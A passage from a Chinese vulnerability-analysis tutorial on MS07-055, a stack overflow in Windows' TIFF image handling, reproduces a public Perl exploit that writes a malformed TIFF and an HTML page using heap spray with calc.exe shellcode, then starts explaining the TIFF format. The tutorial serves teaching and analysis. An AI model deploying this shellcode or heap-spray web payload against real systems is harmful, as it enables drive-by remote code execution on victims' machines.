@@ -1,0 +1,144 @@
+
+# 【技术专题】软件漏洞分析入门_8_ 案例_Microsoft TIFF 图像文件处理栈溢出漏洞(MS07-055)
+
+> 原文：[`www.pediy.com/kssd/pediy09/pediy09-368.htm`](https://www.pediy.com/kssd/pediy09/pediy09-368.htm)
+
+> 为支持老大 failwest 的新书《0day 安全：软件漏洞分析与利用》的发行，响应看雪在漏洞分析领域的雄起，特贡献漏洞案例实战分析文章如下:
+
+> **Microsoft TIFF 图像文件处理栈溢出漏洞（MS07-055）**
+
+> 张东辉\[shineast\]\[http://hi.baidu.com/shineastdh\]
+
+**漏洞背景**  
+TIFF（TagImageFileformat）是 Mac 中广泛使用的图像格式，它由 Aldus 和微软联合开发，最初是出于跨平台存储扫描图像的需要而设计的。它的特点是图像格式复杂、存贮信息多。正因为它存储的图像细微层次的信息非常多，图像的质量也得以提高，故而非常有利于原稿的复制。该格式有压缩和非压缩二种形式，其中压缩可采用 LZW 无损压缩方案存储。不过，由于 TIFF 格式结构较为复杂，兼容性较差，因此有时你的软件可能不能正确识别 TIFF 文件（现在绝大部分软件都已解决了这个问题）。目前在 Mac 和 PC 机上移植 TIFF 文件也十分便捷，因而 TIFF 现在也是微机上使用最广泛的图像文件格式之一。
+
+2007 年 10 月 9 日，微软的网站上公示了“Microsoft 安全公告 MS07-055 - 严重 Kodak 图像查看器中的漏洞可能允许远程执行代码 (923810)”这个安全公告，并提供了该漏洞的补丁程序。此漏洞仅存在于运行 Windows 2000 的系统上。但是，如果是从 Windows 2000 升级的，运行受支持版本的 Windows XP 和 Windows Server 2003 也可能受影响。10 月 29 日和 11 月 11 日，milw0rm 上公布了利用这个漏洞的两个程序，一个是利用 explorer 溢出的；另一个是利用 IE 溢出的，可以做网络木马。同时绿盟的网站上也发布了紧急通告——“绿盟科技紧急通告(Alert2007-10)”。攻击者可以通过构建特制图像来利用此漏洞，如果用户访问网站、查看特制电子邮件或者打开电子邮件附件，该漏洞可能允许远程执行指令。成功利用此漏洞的攻击者可以完全控制受影响的系统。应该说这个漏洞的危害性还是很大的，属于“严重”、“紧急”级别的漏洞。
+
+另外，同一时间，除了 MS07-055，微软还公布了 MS07-056 到 MS07-060。这些安全公告分别描述了 8 个安全问题，分别是有关各版本的 Microsoft Windows、IE、Outlook Express 和 Windows Mail 和 SharePoint 等产品和服务中的漏洞。
+
+## 漏洞重现与漏洞分析
+
+要分析这个漏洞，一定要能够重现这个漏洞，然后通过跟踪和调试来分析它。如果你的 WindowsXP 系统不是从 Windows2000 升级过来的，最好先安装一个虚拟机，虚拟一个 Win2K 操作系统，然后在这个系统下做漏洞重现。我在 VMware 中安装的是 Win2K SP3，当然 SP4 也可以，只要是 2K 系统都可以，因为这个漏洞是新出的。如果你的 2K 系统已经对这个漏洞（MS07-055）打了漏洞补丁（KB923810），你可以先把漏洞补丁在“添加删除程序”中卸载掉，做完实验后可以在安装上。另外还要安装一下 ActivePerl，用来运行 perl 程序代码。把这些准备工作做好后，我们就可以开始漏洞重现了。
+
+Milw0rm 上关于这个漏洞公布了 2 个 exploit，我分析了一下，这两个 exploit 利用的漏洞是同一个，就是我们现在要分析的 tiff 文件格式处理漏洞，但是它们的利用方式不同，一个是直接在 explorer 下就溢出，也就是说当你用 explorer 打开了畸形 tiff 文件所在的目录时，漏洞就已经使 explorer 溢出了；另一个是可以用来做网络木马，也就是说，当你打开了远程 web 服务器上的某个网页时，而网页恰好打开了那个畸形 tiff 文件，那个就会在你本地发生 IE 栈溢出，从而执行任意代码，即 shellocde。
+
+那么我这里仅通过最新的网页木马方式的 exploit 来分析这个漏洞，最终让大家看到这个漏洞发生的根本原因。下面我们首先来看看这个 exploit 是如何写成的：
+
+```
+#!/usr/bin/perl
+# Microsoft Internet Explorer TIF/TIFF Code Execution (MS07-055)
+# This exploit tested on:
+#  - Windows 2000 SP4 + IE5.01
+#  - Windows 2000 SP4 + IE5.5
+#  - Windows 2000 SP4 + IE6.0 SP1
+# invokes calc.exe if successful
+use strict;
+# run calc.exe
+my $shellcode =
+"\\xfc\\xe8\\x44\\x00\\x00\\x00\\x8b\\x45\\x3c\\x8b\\x7c\\x05\\x78\\x01\\xef\\x8b".
+"\\x4f\\x18\\x8b\\x5f\\x20\\x01\\xeb\\x49\\x8b\\x34\\x8b\\x01\\xee\\x31\\xc0\\x99".
+"\\xac\\x84\\xc0\\x74\\x07\\xc1\\xca\\x0d\\x01\\xc2\\xeb\\xf4\\x3b\\x54\\x24\\x04".
+"\\x75\\xe5\\x8b\\x5f\\x24\\x01\\xeb\\x66\\x8b\\x0c\\x4b\\x8b\\x5f\\x1c\\x01\\xeb".
+"\\x8b\\x1c\\x8b\\x01\\xeb\\x89\\x5c\\x24\\x04\\xc3\\x31\\xc0\\x64\\x8b\\x40\\x30".
+"\\x85\\xc0\\x78\\x0c\\x8b\\x40\\x0c\\x8b\\x70\\x1c\\xad\\x8b\\x68\\x08\\xeb\\x09".
+"\\x8b\\x80\\xb0\\x00\\x00\\x00\\x8b\\x68\\x3c\\x5f\\x31\\xf6\\x60\\x56\\x89\\xf8".
+"\\x83\\xc0\\x7b\\x50\\x68\\x7e\\xd8\\xe2\\x73\\x68\\x98\\xfe\\x8a\\x0e\\x57\\xff".
+"\\xe7\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00";
+my $tiff1 =
+"\\x49\\x49\\x2A\\x00\\x90\\x3E\\x00\\x00\\x80\\x3F\\xE0\\x50".
+"\\x38\\x24\\x16\\x0D\\x07\\x84\\x42\\x61\\x50\\xB8\\x64\\x36".
+"\\x1D\\x0F\\x88\\x44\\x62\\x51\\x38\\xA4\\x56\\x2D\\x17\\x8C".
+"\\x46\\x63\\x51\\xB8\\xE4\\x76\\x3D\\x1F\\x90\\x48\\x64\\x52".
+"\\x39\\x24\\x96\\x4D\\x27\\x94\\x4A\\x65\\x52\\xB9\\x64\\xB6".
+。。。(略)。。。
+"\\x56\\xAD\\x57\\x86\\x40\\x40\\x60\\x00\\x00\\x00\\x01\\x00".
+"\\x00\\x00\\x60\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x08\\x00".
+"\\x08\\x00\\x08\\x00\\xAE\\x00\\x00\\x00\\xAE\\x00\\x00\\x00".
+"\\xAE\\x00\\x00\\x00\\xAE\\x00\\x00\\x00\\xAE\\x00\\x00\\x00".
+"\\xAE\\x00\\x00\\x00\\xB4\\x00\\x00\\x00\\xBA\\x00\\x00\\x00".
+"\\xBA\\x00\\x03\\x00\\xCA\\x00\\x00\\x00\\xDB\\x00\\x00\\x00".
+"\\xD7\\x00\\x00\\x00\\xD6\\x00";
+my $eip = "\\x0c\\x0c\\x0c\\x0c";
+my $data_0400 = "\\x08\\x00\\x40\\x00";
+my $data_null = "\\x11\\x00\\x40\\x00";
+my $tiff2 =
+"\\x00\\x00\\xB9\\x90\\x90\\x90\\x90\\x90\\xFC\\xE8".
+"\\x44\\x00\\x00\\x00\\x8B\\x45\\x3C\\x8B\\x7C\\x05\\x78\\x01".
+"\\xEF\\x8B\\x4F\\x18\\x8B\\x5F\\x20\\x01\\xEB\\x49\\x8B\\x34".
+"\\x8B\\x01\\xEE\\x31\\xC0\\x99\\xAC\\x84\\xC0\\x74\\x07\\xC1".
+"\\xCA\\x0D\\x01\\xC2\\xEB\\xF4\\x3B\\x54\\x24\\x04\\x75\\xE5".
+。。。(略)。。。
+"\\xB6\\x3A\\x00\\x00\\x64\\x3B\\x00\\x00\\x0F\\x00\\xFE\\x00".
+"\\x04\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01".
+"\\x03\\x00\\x01\\x00\\x00\\x00\\x80\\x02\\x00\\x00\\x01\\x01".
+"\\x03\\x00\\x01\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x02\\x01".
+"\\x03\\x00\\xFF\\x00\\x00\\x00\\xDA\\x3B\\x00\\x00\\x03\\x01".
+"\\x03\\x00\\x01\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x06\\x01".
+"\\x03\\x00\\x01\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x11\\x01".
+"\\x04\\x00\\x56\\x00\\x00\\x00\\x38\\x3D\\x00\\x00\\x15\\x01".
+"\\x03\\x00\\x01\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x16\\x01".
+"\\x04\\x00\\x01\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x17\\x01".
+"\\x04\\x00\\x56\\x00\\x00\\x00\\xE0\\x3B\\x00\\x00\\x1A\\x01".
+"\\x05\\x00\\x01\\x00\\x00\\x00\\xCA\\x3B\\x00\\x00\\x1B\\x01".
+"\\x05\\x00\\x01\\x00\\x00\\x00\\xD2\\x3B\\x00\\x00\\x1C\\x01".
+"\\x03\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x28\\x01".
+"\\x03\\x00\\x01\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x3D\\x01".
+"\\x03\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00".
+"\\x00\\x00";
+# convert shellcode for javascript
+if ((length($shellcode) / 2) =~ /\\./) {
+  $shellcode .= "\\x00";
+}
+$shellcode =~ s/(.)(.)/'%u'.unpack("H\*", $2).unpack("H\*", $1)/ge;
+# write tiff file
+open(FILE, ">ms07-055.tif");
+binmode(FILE);
+print FILE $tiff1;
+print FILE $eip;
+print FILE $data_0400;
+print FILE $data_0400;
+print FILE $data_0400;
+print FILE $data_null;
+print FILE $tiff2;
+close(FILE);
+# write html file
+open(FILE, ">ms07-055.html");
+print FILE <<HTML;
+<html><head>
+<title>Microsoft Internet Explorer TIF/TIFF Code Execution (MS07-055)</title>
+<script language="JavaScript">
+<!-- var memory = new Array();
+function getSpraySlide(spraySlide, spraySlideSize){
+  while (spraySlide.length*2<spraySlideSize){
+    spraySlide += spraySlide;
+  }
+  spraySlide = spraySlide.substring(0,spraySlideSize/2);
+  return spraySlide;
+}
+function makeSlide(){
+  var heapSprayToAddress = 0x0c0c0c0c;
+  var payLoadCode = unescape("$shellcode");
+  var heapBlockSize = 0x400000;
+  var payLoadSize = payLoadCode.length * 2;
+  var spraySlideSize = heapBlockSize - (payLoadSize+0x38);
+  var spraySlide = unescape("%u0c0c%u0c0c");
+  spraySlide = getSpraySlide(spraySlide,spraySlideSize);
+  heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize;
+  for (i=0;i<heapBlocks;i++) {
+    memory[i] = spraySlide + payLoadCode;
+  }
+  return 0;
+}
+makeSlide();//-->
+</script>
+</head>
+<body><img src="ms07-055.tif"></body></html>
+HTML
+close(FILE);
+```
+
+看了这段 perl 程序，大概知道是怎么回事了，其实就是用这段 perl 程序写了两个文件，一个是特制的、畸形的 tiff 文件，命名为“ms07-055.tif”；另一个是 HTML 文件，自然就是网马了。其中 HTML 文件很明白，这个网页用来打开前面那个 tiff 文件，打开之前还在 0c0c0c0c 内存地址附近请求了连续的若干内存块，每个内存块中存放的是一片片 0c0c0c0c 指令，最后跟着的是 shellcode。0c0c0c0c 指令没有什么特殊目的，就像 nop 指令一样。如此以来一旦程序被溢出跳到 0c0c0c0c 地址即可，就可以执行我们预期的 shellcode 了。——这个逻辑应该很清楚了，说的专业一点就是 Heap Spray 技术。
+
+理解了如何利用，现在我们的关键就是需要掌握一些 tiff 图像文件格式规范，不需要很专业的掌握，只要对这种文件格式的基础知识有所了解就足够我们分析漏洞了。下面我来描述一下文件的基本规范，考虑到看英文比较难受的朋友，我特意翻译了一把，希望对大家有所帮助。需要英文原文的朋友也可以从本文的光盘相关中得到。
+
+一个完整的 tiff 文件首先有 8 字节的头部（header），头部中含有一个指针指向一个图像文件目录，简称 IFD（image file directory），每个 IFD 包含了重要的图像信息，这些信息是一条一条的存储在 IFD 中的，称为目录条目，简称 DE（directory entry）。具体的说，可以用下面这个图示来说明他们之间的逻辑关系。
